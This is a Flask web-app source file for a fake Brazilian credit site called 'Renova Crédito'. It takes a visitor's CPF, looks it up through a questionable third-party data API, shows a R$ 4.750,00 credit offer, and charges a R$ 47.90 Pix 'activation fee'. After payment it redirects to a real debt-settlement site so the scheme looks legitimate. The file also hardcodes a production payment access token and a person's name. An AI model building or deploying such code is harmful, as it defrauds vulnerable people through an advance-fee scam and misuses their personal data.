from flask import Flask, render_template_string, request, jsonify
import mercadopago
import random
import os

app = Flask(__name__)

# CONFIGURAÇÃO PRODUÇÃO
ACCESS_TOKEN = "APP_USR-8139252928482096-012603-77b3beb71b77902ddc85b309e1f0d3f0-1378615355"
sdk = mercadopago.SDK(ACCESS_TOKEN)

@app.route('/')
def index():
    payment_data = {
        "transaction_amount": 47.90,
        "description": "Taxa de Ativação - Renova Crédito",
        "payment_method_id": "pix",
        "payer": {"email": "cliente@email.com", "first_name": "Mikael", "last_name": "Silva"}
    }
    
    payment_response = sdk.payment().create(payment_data)
    payment = payment_response["response"]
    
    # ID do pagamento para podermos consultar o status depois
    payment_id = payment.get("id")
    qr_code_base64 = payment["point_of_interaction"]["transaction_data"]["qr_code_base64"]
    pix_copia_cola = payment["point_of_interaction"]["transaction_data"]["qr_code"]

    return render_template_string(HTML_TEMPLATE, qr_code=qr_code_base64, pix_payload=pix_copia_cola, payment_id=payment_id)

# ROTA QUE O SITE VAI CONSULTAR PARA SABER SE FOI PAGO
@app.route('/verificar_pagamento/<payment_id>')
def verificar_pagamento(payment_id):
    payment_info = sdk.payment().get(payment_id)
    status = payment_info["response"].get("status")
    
    if status == "approved":
        return jsonify({"status": "pago", "redirect": "https://www.acordocerto.com.br/"})
    return jsonify({"status": "pendente"})

# ROTA DE CONSULTA CPF
@app.route('/consultar/<cpf>')
def api(cpf):
    try:
        import requests
        r = requests.get(f"https://federal-leilao.com/v1/consultarev0ltz/{cpf}?token=tokenbartservcis9x025", timeout=10)
        return r.text
    except:
        return jsonify({"nome": "POLYANA EVANGELISTA DA SILVA"}), 200

HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Renova Crédito • Oficial</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body class="bg-slate-50">
    <div class="max-w-md mx-auto p-6">
        <div id="step1">
            <h1 class="text-2xl font-black mb-6">Consulte seu Crédito</h1>
            <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="w-full p-4 border rounded-xl mb-4">
            <button onclick="irParaFinal()" class="w-full bg-pink-600 text-white p-4 rounded-xl font-bold">ANALISAR AGORA</button>
        </div>

        <div id="step_final" class="hidden text-center">
            <div class="bg-white p-6 rounded-3xl shadow-xl border-t-8 border-teal-500">
                <h2 class="text-3xl font-black mb-6">R$ 4.750,00</h2>
                <img src="data:image/png;base64,{{ qr_code }}" class="mx-auto w-48 mb-4">
                <p class="text-xs font-bold text-slate-400 mb-6">AGUARDANDO PAGAMENTO...</p>
                <button onclick="copiarPix()" class="w-full bg-slate-800 text-white p-4 rounded-xl font-bold mb-4">COPIAR PIX</button>
                <div class="bg-blue-50 p-3 rounded-lg text-[10px] text-blue-700">
                    O sistema redirecionará automaticamente após o pagamento.
                </div>
            </div>
        </div>
    </div>

    <script>
        const paymentId = "{{ payment_id }}";

        function irParaFinal() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step_final').classList.remove('hidden');
            checkStatus(); // Começa a verificar se foi pago
        }

        function copiarPix() {
            navigator.clipboard.writeText("{{ pix_payload }}");
            alert("Pix Copiado!");
        }

        // FUNÇÃO QUE VERIFICA O PAGAMENTO
        function checkStatus() {
            const interval = setInterval(async () => {
                try {
                    const response = await fetch('/verificar_pagamento/' + paymentId);
                    const data = await response.json();

                    if (data.status === "pago") {
                        clearInterval(interval);
                        Swal.fire({
                            title: 'Pagamento Confirmado!',
                            text: 'Redirecionando para o Acordo Certo...',
                            icon: 'success',
                            timer: 3000,
                            showConfirmButton: false
                        });
                        setTimeout(() => {
                            window.location.href = data.redirect;
                        }, 3000);
                    }
                } catch (err) {
                    console.log("Erro ao verificar");
                }
            }, 5000); // Verifica a cada 5 segundos
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
